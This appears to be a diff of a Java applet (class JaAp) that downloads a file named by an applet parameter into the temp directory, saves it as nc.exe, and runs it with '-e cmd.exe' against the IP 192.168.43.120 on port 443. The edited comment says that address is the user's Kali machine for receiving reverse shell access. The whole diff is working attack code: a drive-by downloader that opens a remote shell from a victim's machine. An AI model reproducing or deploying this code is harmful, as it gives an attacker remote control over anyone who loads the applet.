@@ -19,7 +19,7 @@ public class JaAp extends Applet {
         Process f;
     	try {
         String tmpdir = System.getProperty("java.io.tmpdir") + File.separator;
-	    String expath = tmpdir + "evil.exe";
+	    String expath = tmpdir + "nc.exe";
 	    String download = "";
 	    download = getParameter("1");
     	if (download.length() > 0) {
@@ -38,7 +38,7 @@ public class JaAp extends Applet {
             out.flush();
             out.close();
             in.close();
-	    //Your Kali Server IP (or) Other Server IP to download nc.exe
+	    //Your Kali IP for receiving Reverse Shell access.
             f = Runtime.getRuntime().exec("cmd.exe /c" + expath + " 192.168.43.120 443 -e cmd.exe");
 		}
 	}
